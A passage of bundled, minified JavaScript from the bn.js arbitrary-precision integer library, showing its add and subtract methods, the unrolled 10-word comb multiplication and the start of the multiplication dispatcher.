                        for (; 0 !== carry && i < a.length; i++) (r = (0 | a.words[i]) + carry), (this.words[i] = 67108863 & r), (carry = r >>> 26);
                        if (((this.length = a.length), 0 !== carry)) (this.words[this.length] = carry), this.length++;
                        else if (a !== this) for (; i < a.length; i++) this.words[i] = a.words[i];
                        return this;
                    }),
                    (BN.prototype.add = function (num) {
                        var res;
                        return 0 !== num.negative && 0 === this.negative
                            ? ((num.negative = 0), (res = this.sub(num)), (num.negative ^= 1), res)
                            : 0 === num.negative && 0 !== this.negative
                            ? ((this.negative = 0), (res = num.sub(this)), (this.negative = 1), res)
                            : this.length > num.length
                            ? this.clone().iadd(num)
                            : num.clone().iadd(this);
                    }),
                    (BN.prototype.isub = function (num) {
                        if (0 !== num.negative) {
                            num.negative = 0;
                            var r = this.iadd(num);
                            return (num.negative = 1), r._normSign();
                        }
                        if (0 !== this.negative) return (this.negative = 0), this.iadd(num), (this.negative = 1), this._normSign();
                        var a,
                            b,
                            cmp = this.cmp(num);
                        if (0 === cmp) return (this.negative = 0), (this.length = 1), (this.words[0] = 0), this;
                        cmp > 0 ? ((a = this), (b = num)) : ((a = num), (b = this));
                        for (var carry = 0, i = 0; i < b.length; i++) (carry = (r = (0 | a.words[i]) - (0 | b.words[i]) + carry) >> 26), (this.words[i] = 67108863 & r);
                        for (; 0 !== carry && i < a.length; i++) (carry = (r = (0 | a.words[i]) + carry) >> 26), (this.words[i] = 67108863 & r);
                        if (0 === carry && i < a.length && a !== this) for (; i < a.length; i++) this.words[i] = a.words[i];
                        return (this.length = Math.max(this.length, i)), a !== this && (this.negative = 1), this.strip();
                    }),
                    (BN.prototype.sub = function (num) {
                        return this.clone().isub(num);
                    });
                var comb10MulTo = function (self, num, out) {
                    var lo,
                        mid,
                        hi,
                        a = self.words,
                        b = num.words,
                        o = out.words,
                        c = 0,
                        a0 = 0 | a[0],
                        al0 = 8191 & a0,
                        ah0 = a0 >>> 13,
                        a1 = 0 | a[1],
                        al1 = 8191 & a1,
                        ah1 = a1 >>> 13,
                        a2 = 0 | a[2],
                        al2 = 8191 & a2,
                        ah2 = a2 >>> 13,
                        a3 = 0 | a[3],
                        al3 = 8191 & a3,
                        ah3 = a3 >>> 13,
                        a4 = 0 | a[4],
                        al4 = 8191 & a4,
                        ah4 = a4 >>> 13,
                        a5 = 0 | a[5],
                        al5 = 8191 & a5,
                        ah5 = a5 >>> 13,
                        a6 = 0 | a[6],
                        al6 = 8191 & a6,
                        ah6 = a6 >>> 13,
                        a7 = 0 | a[7],
                        al7 = 8191 & a7,
                        ah7 = a7 >>> 13,
                        a8 = 0 | a[8],
                        al8 = 8191 & a8,
                        ah8 = a8 >>> 13,
                        a9 = 0 | a[9],
                        al9 = 8191 & a9,
                        ah9 = a9 >>> 13,
                        b0 = 0 | b[0],
                        bl0 = 8191 & b0,
                        bh0 = b0 >>> 13,
                        b1 = 0 | b[1],
                        bl1 = 8191 & b1,
                        bh1 = b1 >>> 13,
                        b2 = 0 | b[2],
                        bl2 = 8191 & b2,
                        bh2 = b2 >>> 13,
                        b3 = 0 | b[3],
                        bl3 = 8191 & b3,
                        bh3 = b3 >>> 13,
                        b4 = 0 | b[4],
                        bl4 = 8191 & b4,
                        bh4 = b4 >>> 13,
                        b5 = 0 | b[5],
                        bl5 = 8191 & b5,
                        bh5 = b5 >>> 13,
                        b6 = 0 | b[6],
                        bl6 = 8191 & b6,
                        bh6 = b6 >>> 13,
                        b7 = 0 | b[7],
                        bl7 = 8191 & b7,
                        bh7 = b7 >>> 13,
                        b8 = 0 | b[8],
                        bl8 = 8191 & b8,
                        bh8 = b8 >>> 13,
                        b9 = 0 | b[9],
                        bl9 = 8191 & b9,
                        bh9 = b9 >>> 13;
                    (out.negative = self.negative ^ num.negative), (out.length = 19);
                    var w0 = (((c + (lo = Math.imul(al0, bl0))) | 0) + ((8191 & (mid = ((mid = Math.imul(al0, bh0)) + Math.imul(ah0, bl0)) | 0)) << 13)) | 0;
                    (c = ((((hi = Math.imul(ah0, bh0)) + (mid >>> 13)) | 0) + (w0 >>> 26)) | 0), (w0 &= 67108863), (lo = Math.imul(al1, bl0)), (mid = ((mid = Math.imul(al1, bh0)) + Math.imul(ah1, bl0)) | 0), (hi = Math.imul(ah1, bh0));
                    var w1 = (((c + (lo = (lo + Math.imul(al0, bl1)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh1)) | 0) + Math.imul(ah0, bl1)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh1)) | 0) + (mid >>> 13)) | 0) + (w1 >>> 26)) | 0),
                        (w1 &= 67108863),
                        (lo = Math.imul(al2, bl0)),
                        (mid = ((mid = Math.imul(al2, bh0)) + Math.imul(ah2, bl0)) | 0),
                        (hi = Math.imul(ah2, bh0)),
                        (lo = (lo + Math.imul(al1, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh1)) | 0) + Math.imul(ah1, bl1)) | 0),
                        (hi = (hi + Math.imul(ah1, bh1)) | 0);
                    var w2 = (((c + (lo = (lo + Math.imul(al0, bl2)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh2)) | 0) + Math.imul(ah0, bl2)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh2)) | 0) + (mid >>> 13)) | 0) + (w2 >>> 26)) | 0),
                        (w2 &= 67108863),
                        (lo = Math.imul(al3, bl0)),
                        (mid = ((mid = Math.imul(al3, bh0)) + Math.imul(ah3, bl0)) | 0),
                        (hi = Math.imul(ah3, bh0)),
                        (lo = (lo + Math.imul(al2, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh1)) | 0) + Math.imul(ah2, bl1)) | 0),
                        (hi = (hi + Math.imul(ah2, bh1)) | 0),
                        (lo = (lo + Math.imul(al1, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh2)) | 0) + Math.imul(ah1, bl2)) | 0),
                        (hi = (hi + Math.imul(ah1, bh2)) | 0);
                    var w3 = (((c + (lo = (lo + Math.imul(al0, bl3)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh3)) | 0) + Math.imul(ah0, bl3)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh3)) | 0) + (mid >>> 13)) | 0) + (w3 >>> 26)) | 0),
                        (w3 &= 67108863),
                        (lo = Math.imul(al4, bl0)),
                        (mid = ((mid = Math.imul(al4, bh0)) + Math.imul(ah4, bl0)) | 0),
                        (hi = Math.imul(ah4, bh0)),
                        (lo = (lo + Math.imul(al3, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh1)) | 0) + Math.imul(ah3, bl1)) | 0),
                        (hi = (hi + Math.imul(ah3, bh1)) | 0),
                        (lo = (lo + Math.imul(al2, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh2)) | 0) + Math.imul(ah2, bl2)) | 0),
                        (hi = (hi + Math.imul(ah2, bh2)) | 0),
                        (lo = (lo + Math.imul(al1, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh3)) | 0) + Math.imul(ah1, bl3)) | 0),
                        (hi = (hi + Math.imul(ah1, bh3)) | 0);
                    var w4 = (((c + (lo = (lo + Math.imul(al0, bl4)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh4)) | 0) + Math.imul(ah0, bl4)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh4)) | 0) + (mid >>> 13)) | 0) + (w4 >>> 26)) | 0),
                        (w4 &= 67108863),
                        (lo = Math.imul(al5, bl0)),
                        (mid = ((mid = Math.imul(al5, bh0)) + Math.imul(ah5, bl0)) | 0),
                        (hi = Math.imul(ah5, bh0)),
                        (lo = (lo + Math.imul(al4, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh1)) | 0) + Math.imul(ah4, bl1)) | 0),
                        (hi = (hi + Math.imul(ah4, bh1)) | 0),
                        (lo = (lo + Math.imul(al3, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh2)) | 0) + Math.imul(ah3, bl2)) | 0),
                        (hi = (hi + Math.imul(ah3, bh2)) | 0),
                        (lo = (lo + Math.imul(al2, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh3)) | 0) + Math.imul(ah2, bl3)) | 0),
                        (hi = (hi + Math.imul(ah2, bh3)) | 0),
                        (lo = (lo + Math.imul(al1, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh4)) | 0) + Math.imul(ah1, bl4)) | 0),
                        (hi = (hi + Math.imul(ah1, bh4)) | 0);
                    var w5 = (((c + (lo = (lo + Math.imul(al0, bl5)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh5)) | 0) + Math.imul(ah0, bl5)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh5)) | 0) + (mid >>> 13)) | 0) + (w5 >>> 26)) | 0),
                        (w5 &= 67108863),
                        (lo = Math.imul(al6, bl0)),
                        (mid = ((mid = Math.imul(al6, bh0)) + Math.imul(ah6, bl0)) | 0),
                        (hi = Math.imul(ah6, bh0)),
                        (lo = (lo + Math.imul(al5, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh1)) | 0) + Math.imul(ah5, bl1)) | 0),
                        (hi = (hi + Math.imul(ah5, bh1)) | 0),
                        (lo = (lo + Math.imul(al4, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh2)) | 0) + Math.imul(ah4, bl2)) | 0),
                        (hi = (hi + Math.imul(ah4, bh2)) | 0),
                        (lo = (lo + Math.imul(al3, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh3)) | 0) + Math.imul(ah3, bl3)) | 0),
                        (hi = (hi + Math.imul(ah3, bh3)) | 0),
                        (lo = (lo + Math.imul(al2, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh4)) | 0) + Math.imul(ah2, bl4)) | 0),
                        (hi = (hi + Math.imul(ah2, bh4)) | 0),
                        (lo = (lo + Math.imul(al1, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh5)) | 0) + Math.imul(ah1, bl5)) | 0),
                        (hi = (hi + Math.imul(ah1, bh5)) | 0);
                    var w6 = (((c + (lo = (lo + Math.imul(al0, bl6)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh6)) | 0) + Math.imul(ah0, bl6)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh6)) | 0) + (mid >>> 13)) | 0) + (w6 >>> 26)) | 0),
                        (w6 &= 67108863),
                        (lo = Math.imul(al7, bl0)),
                        (mid = ((mid = Math.imul(al7, bh0)) + Math.imul(ah7, bl0)) | 0),
                        (hi = Math.imul(ah7, bh0)),
                        (lo = (lo + Math.imul(al6, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh1)) | 0) + Math.imul(ah6, bl1)) | 0),
                        (hi = (hi + Math.imul(ah6, bh1)) | 0),
                        (lo = (lo + Math.imul(al5, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh2)) | 0) + Math.imul(ah5, bl2)) | 0),
                        (hi = (hi + Math.imul(ah5, bh2)) | 0),
                        (lo = (lo + Math.imul(al4, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh3)) | 0) + Math.imul(ah4, bl3)) | 0),
                        (hi = (hi + Math.imul(ah4, bh3)) | 0),
                        (lo = (lo + Math.imul(al3, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh4)) | 0) + Math.imul(ah3, bl4)) | 0),
                        (hi = (hi + Math.imul(ah3, bh4)) | 0),
                        (lo = (lo + Math.imul(al2, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh5)) | 0) + Math.imul(ah2, bl5)) | 0),
                        (hi = (hi + Math.imul(ah2, bh5)) | 0),
                        (lo = (lo + Math.imul(al1, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh6)) | 0) + Math.imul(ah1, bl6)) | 0),
                        (hi = (hi + Math.imul(ah1, bh6)) | 0);
                    var w7 = (((c + (lo = (lo + Math.imul(al0, bl7)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh7)) | 0) + Math.imul(ah0, bl7)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh7)) | 0) + (mid >>> 13)) | 0) + (w7 >>> 26)) | 0),
                        (w7 &= 67108863),
                        (lo = Math.imul(al8, bl0)),
                        (mid = ((mid = Math.imul(al8, bh0)) + Math.imul(ah8, bl0)) | 0),
                        (hi = Math.imul(ah8, bh0)),
                        (lo = (lo + Math.imul(al7, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh1)) | 0) + Math.imul(ah7, bl1)) | 0),
                        (hi = (hi + Math.imul(ah7, bh1)) | 0),
                        (lo = (lo + Math.imul(al6, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh2)) | 0) + Math.imul(ah6, bl2)) | 0),
                        (hi = (hi + Math.imul(ah6, bh2)) | 0),
                        (lo = (lo + Math.imul(al5, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh3)) | 0) + Math.imul(ah5, bl3)) | 0),
                        (hi = (hi + Math.imul(ah5, bh3)) | 0),
                        (lo = (lo + Math.imul(al4, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh4)) | 0) + Math.imul(ah4, bl4)) | 0),
                        (hi = (hi + Math.imul(ah4, bh4)) | 0),
                        (lo = (lo + Math.imul(al3, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh5)) | 0) + Math.imul(ah3, bl5)) | 0),
                        (hi = (hi + Math.imul(ah3, bh5)) | 0),
                        (lo = (lo + Math.imul(al2, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh6)) | 0) + Math.imul(ah2, bl6)) | 0),
                        (hi = (hi + Math.imul(ah2, bh6)) | 0),
                        (lo = (lo + Math.imul(al1, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh7)) | 0) + Math.imul(ah1, bl7)) | 0),
                        (hi = (hi + Math.imul(ah1, bh7)) | 0);
                    var w8 = (((c + (lo = (lo + Math.imul(al0, bl8)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh8)) | 0) + Math.imul(ah0, bl8)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh8)) | 0) + (mid >>> 13)) | 0) + (w8 >>> 26)) | 0),
                        (w8 &= 67108863),
                        (lo = Math.imul(al9, bl0)),
                        (mid = ((mid = Math.imul(al9, bh0)) + Math.imul(ah9, bl0)) | 0),
                        (hi = Math.imul(ah9, bh0)),
                        (lo = (lo + Math.imul(al8, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh1)) | 0) + Math.imul(ah8, bl1)) | 0),
                        (hi = (hi + Math.imul(ah8, bh1)) | 0),
                        (lo = (lo + Math.imul(al7, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh2)) | 0) + Math.imul(ah7, bl2)) | 0),
                        (hi = (hi + Math.imul(ah7, bh2)) | 0),
                        (lo = (lo + Math.imul(al6, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh3)) | 0) + Math.imul(ah6, bl3)) | 0),
                        (hi = (hi + Math.imul(ah6, bh3)) | 0),
                        (lo = (lo + Math.imul(al5, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh4)) | 0) + Math.imul(ah5, bl4)) | 0),
                        (hi = (hi + Math.imul(ah5, bh4)) | 0),
                        (lo = (lo + Math.imul(al4, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh5)) | 0) + Math.imul(ah4, bl5)) | 0),
                        (hi = (hi + Math.imul(ah4, bh5)) | 0),
                        (lo = (lo + Math.imul(al3, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh6)) | 0) + Math.imul(ah3, bl6)) | 0),
                        (hi = (hi + Math.imul(ah3, bh6)) | 0),
                        (lo = (lo + Math.imul(al2, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh7)) | 0) + Math.imul(ah2, bl7)) | 0),
                        (hi = (hi + Math.imul(ah2, bh7)) | 0),
                        (lo = (lo + Math.imul(al1, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh8)) | 0) + Math.imul(ah1, bl8)) | 0),
                        (hi = (hi + Math.imul(ah1, bh8)) | 0);
                    var w9 = (((c + (lo = (lo + Math.imul(al0, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh9)) | 0) + Math.imul(ah0, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh9)) | 0) + (mid >>> 13)) | 0) + (w9 >>> 26)) | 0),
                        (w9 &= 67108863),
                        (lo = Math.imul(al9, bl1)),
                        (mid = ((mid = Math.imul(al9, bh1)) + Math.imul(ah9, bl1)) | 0),
                        (hi = Math.imul(ah9, bh1)),
                        (lo = (lo + Math.imul(al8, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh2)) | 0) + Math.imul(ah8, bl2)) | 0),
                        (hi = (hi + Math.imul(ah8, bh2)) | 0),
                        (lo = (lo + Math.imul(al7, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh3)) | 0) + Math.imul(ah7, bl3)) | 0),
                        (hi = (hi + Math.imul(ah7, bh3)) | 0),
                        (lo = (lo + Math.imul(al6, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh4)) | 0) + Math.imul(ah6, bl4)) | 0),
                        (hi = (hi + Math.imul(ah6, bh4)) | 0),
                        (lo = (lo + Math.imul(al5, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh5)) | 0) + Math.imul(ah5, bl5)) | 0),
                        (hi = (hi + Math.imul(ah5, bh5)) | 0),
                        (lo = (lo + Math.imul(al4, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh6)) | 0) + Math.imul(ah4, bl6)) | 0),
                        (hi = (hi + Math.imul(ah4, bh6)) | 0),
                        (lo = (lo + Math.imul(al3, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh7)) | 0) + Math.imul(ah3, bl7)) | 0),
                        (hi = (hi + Math.imul(ah3, bh7)) | 0),
                        (lo = (lo + Math.imul(al2, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh8)) | 0) + Math.imul(ah2, bl8)) | 0),
                        (hi = (hi + Math.imul(ah2, bh8)) | 0);
                    var w10 = (((c + (lo = (lo + Math.imul(al1, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al1, bh9)) | 0) + Math.imul(ah1, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah1, bh9)) | 0) + (mid >>> 13)) | 0) + (w10 >>> 26)) | 0),
                        (w10 &= 67108863),
                        (lo = Math.imul(al9, bl2)),
                        (mid = ((mid = Math.imul(al9, bh2)) + Math.imul(ah9, bl2)) | 0),
                        (hi = Math.imul(ah9, bh2)),
                        (lo = (lo + Math.imul(al8, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh3)) | 0) + Math.imul(ah8, bl3)) | 0),
                        (hi = (hi + Math.imul(ah8, bh3)) | 0),
                        (lo = (lo + Math.imul(al7, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh4)) | 0) + Math.imul(ah7, bl4)) | 0),
                        (hi = (hi + Math.imul(ah7, bh4)) | 0),
                        (lo = (lo + Math.imul(al6, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh5)) | 0) + Math.imul(ah6, bl5)) | 0),
                        (hi = (hi + Math.imul(ah6, bh5)) | 0),
                        (lo = (lo + Math.imul(al5, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh6)) | 0) + Math.imul(ah5, bl6)) | 0),
                        (hi = (hi + Math.imul(ah5, bh6)) | 0),
                        (lo = (lo + Math.imul(al4, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh7)) | 0) + Math.imul(ah4, bl7)) | 0),
                        (hi = (hi + Math.imul(ah4, bh7)) | 0),
                        (lo = (lo + Math.imul(al3, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh8)) | 0) + Math.imul(ah3, bl8)) | 0),
                        (hi = (hi + Math.imul(ah3, bh8)) | 0);
                    var w11 = (((c + (lo = (lo + Math.imul(al2, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al2, bh9)) | 0) + Math.imul(ah2, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah2, bh9)) | 0) + (mid >>> 13)) | 0) + (w11 >>> 26)) | 0),
                        (w11 &= 67108863),
                        (lo = Math.imul(al9, bl3)),
                        (mid = ((mid = Math.imul(al9, bh3)) + Math.imul(ah9, bl3)) | 0),
                        (hi = Math.imul(ah9, bh3)),
                        (lo = (lo + Math.imul(al8, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh4)) | 0) + Math.imul(ah8, bl4)) | 0),
                        (hi = (hi + Math.imul(ah8, bh4)) | 0),
                        (lo = (lo + Math.imul(al7, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh5)) | 0) + Math.imul(ah7, bl5)) | 0),
                        (hi = (hi + Math.imul(ah7, bh5)) | 0),
                        (lo = (lo + Math.imul(al6, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh6)) | 0) + Math.imul(ah6, bl6)) | 0),
                        (hi = (hi + Math.imul(ah6, bh6)) | 0),
                        (lo = (lo + Math.imul(al5, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh7)) | 0) + Math.imul(ah5, bl7)) | 0),
                        (hi = (hi + Math.imul(ah5, bh7)) | 0),
                        (lo = (lo + Math.imul(al4, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh8)) | 0) + Math.imul(ah4, bl8)) | 0),
                        (hi = (hi + Math.imul(ah4, bh8)) | 0);
                    var w12 = (((c + (lo = (lo + Math.imul(al3, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al3, bh9)) | 0) + Math.imul(ah3, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah3, bh9)) | 0) + (mid >>> 13)) | 0) + (w12 >>> 26)) | 0),
                        (w12 &= 67108863),
                        (lo = Math.imul(al9, bl4)),
                        (mid = ((mid = Math.imul(al9, bh4)) + Math.imul(ah9, bl4)) | 0),
                        (hi = Math.imul(ah9, bh4)),
                        (lo = (lo + Math.imul(al8, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh5)) | 0) + Math.imul(ah8, bl5)) | 0),
                        (hi = (hi + Math.imul(ah8, bh5)) | 0),
                        (lo = (lo + Math.imul(al7, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh6)) | 0) + Math.imul(ah7, bl6)) | 0),
                        (hi = (hi + Math.imul(ah7, bh6)) | 0),
                        (lo = (lo + Math.imul(al6, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh7)) | 0) + Math.imul(ah6, bl7)) | 0),
                        (hi = (hi + Math.imul(ah6, bh7)) | 0),
                        (lo = (lo + Math.imul(al5, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh8)) | 0) + Math.imul(ah5, bl8)) | 0),
                        (hi = (hi + Math.imul(ah5, bh8)) | 0);
                    var w13 = (((c + (lo = (lo + Math.imul(al4, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al4, bh9)) | 0) + Math.imul(ah4, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah4, bh9)) | 0) + (mid >>> 13)) | 0) + (w13 >>> 26)) | 0),
                        (w13 &= 67108863),
                        (lo = Math.imul(al9, bl5)),
                        (mid = ((mid = Math.imul(al9, bh5)) + Math.imul(ah9, bl5)) | 0),
                        (hi = Math.imul(ah9, bh5)),
                        (lo = (lo + Math.imul(al8, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh6)) | 0) + Math.imul(ah8, bl6)) | 0),
                        (hi = (hi + Math.imul(ah8, bh6)) | 0),
                        (lo = (lo + Math.imul(al7, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh7)) | 0) + Math.imul(ah7, bl7)) | 0),
                        (hi = (hi + Math.imul(ah7, bh7)) | 0),
                        (lo = (lo + Math.imul(al6, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh8)) | 0) + Math.imul(ah6, bl8)) | 0),
                        (hi = (hi + Math.imul(ah6, bh8)) | 0);
                    var w14 = (((c + (lo = (lo + Math.imul(al5, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al5, bh9)) | 0) + Math.imul(ah5, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah5, bh9)) | 0) + (mid >>> 13)) | 0) + (w14 >>> 26)) | 0),
                        (w14 &= 67108863),
                        (lo = Math.imul(al9, bl6)),
                        (mid = ((mid = Math.imul(al9, bh6)) + Math.imul(ah9, bl6)) | 0),
                        (hi = Math.imul(ah9, bh6)),
                        (lo = (lo + Math.imul(al8, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh7)) | 0) + Math.imul(ah8, bl7)) | 0),
                        (hi = (hi + Math.imul(ah8, bh7)) | 0),
                        (lo = (lo + Math.imul(al7, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh8)) | 0) + Math.imul(ah7, bl8)) | 0),
                        (hi = (hi + Math.imul(ah7, bh8)) | 0);
                    var w15 = (((c + (lo = (lo + Math.imul(al6, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al6, bh9)) | 0) + Math.imul(ah6, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah6, bh9)) | 0) + (mid >>> 13)) | 0) + (w15 >>> 26)) | 0),
                        (w15 &= 67108863),
                        (lo = Math.imul(al9, bl7)),
                        (mid = ((mid = Math.imul(al9, bh7)) + Math.imul(ah9, bl7)) | 0),
                        (hi = Math.imul(ah9, bh7)),
                        (lo = (lo + Math.imul(al8, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh8)) | 0) + Math.imul(ah8, bl8)) | 0),
                        (hi = (hi + Math.imul(ah8, bh8)) | 0);
                    var w16 = (((c + (lo = (lo + Math.imul(al7, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al7, bh9)) | 0) + Math.imul(ah7, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah7, bh9)) | 0) + (mid >>> 13)) | 0) + (w16 >>> 26)) | 0),
                        (w16 &= 67108863),
                        (lo = Math.imul(al9, bl8)),
                        (mid = ((mid = Math.imul(al9, bh8)) + Math.imul(ah9, bl8)) | 0),
                        (hi = Math.imul(ah9, bh8));
                    var w17 = (((c + (lo = (lo + Math.imul(al8, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al8, bh9)) | 0) + Math.imul(ah8, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah8, bh9)) | 0) + (mid >>> 13)) | 0) + (w17 >>> 26)) | 0), (w17 &= 67108863);
                    var w18 = (((c + (lo = Math.imul(al9, bl9))) | 0) + ((8191 & (mid = ((mid = Math.imul(al9, bh9)) + Math.imul(ah9, bl9)) | 0)) << 13)) | 0;
                    return (
                        (c = ((((hi = Math.imul(ah9, bh9)) + (mid >>> 13)) | 0) + (w18 >>> 26)) | 0),
                        (w18 &= 67108863),
                        (o[0] = w0),
                        (o[1] = w1),
                        (o[2] = w2),
                        (o[3] = w3),
                        (o[4] = w4),
                        (o[5] = w5),
                        (o[6] = w6),
                        (o[7] = w7),
                        (o[8] = w8),
                        (o[9] = w9),
                        (o[10] = w10),
                        (o[11] = w11),
                        (o[12] = w12),
                        (o[13] = w13),
                        (o[14] = w14),
                        (o[15] = w15),
                        (o[16] = w16),
                        (o[17] = w17),
                        (o[18] = w18),
                        0 !== c && ((o[19] = c), out.length++),
                        out
                    );
                };
                function jumboMulTo(self, num, out) {
                    return new FFTM().mulp(self, num, out);
                }
                function FFTM(x, y) {
                    (this.x = x), (this.y = y);
                }
                Math.imul || (comb10MulTo = smallMulTo),
                    (BN.prototype.mulTo = function (num, out) {
                        var len = this.length + num.length;
                        return 10 === this.length && 10 === num.length
                            ? comb10MulTo(this, num, out)
                            : len < 63
                            ? smallMulTo(this, num, out)
                            : len < 1024
                            ? (function (self, num, out) {
                                  (out.negative = num.negative ^ self.negative), (out.length = self.length + num.length);
                                  for (var carry = 0, hncarry = 0, k = 0; k < out.length - 1; k++) {
                                      var ncarry = hncarry;
                                      hncarry = 0;
                                      for (var rword = 67108863 & carry, maxJ = Math.min(k, num.length - 1), j = Math.max(0, k - self.length + 1); j <= maxJ; j++) {
                                          var i = k - j,
                                              r = (0 | self.words[i]) * (0 | num.words[j]),
                                              lo = 67108863 & r;
